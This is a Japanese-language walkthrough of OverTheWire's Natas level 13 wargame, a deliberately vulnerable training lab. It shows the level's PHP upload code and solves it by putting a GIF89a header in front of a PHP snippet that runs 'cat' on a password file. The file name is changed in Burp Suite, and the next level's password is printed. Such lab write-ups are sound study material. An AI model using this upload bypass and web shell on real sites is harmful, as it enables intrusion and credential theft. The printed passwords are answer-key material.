# Natas13
```
Username: natas13
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
URL:      http://natas13.natas.labs.overthewire.org
```
Natas12と同じに見えるが、`For security reasons, we now only accept image files!`と、JPEG以外のファイルはアップロードできなくなってしまった。  

とりあえず`View sourcecode`
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

```
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    }
```
ここの部分でファイルの先頭バイトを読み、ファイルがJPEGかどうかを判定している。  

[exif_imagetype公式マニュアル](https://www.php.net/manual/ja/function.exif-imagetype.php)

なので、phpのコードの先頭に画像の先頭バイトを載せて偽装すれば良い

```
GIF89a
<?php
passthru('cat /etc/natas_webpass/natas14');
?>
```
なぜかJPEGの先頭バイトであるFF D8が使えなかったので[このサイト](https://qiita.com/papillon/items/6904437e4c98e3783eb3)を参考にGIF89aを先頭に追加する。

そして、Level12と同じようにBurp SuiteでInterceptして、書き換えられたファイル名を元のファイル名に戻し、Forwardする。

表示されたリンクをクリックして実行させれば答えが得られる。

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```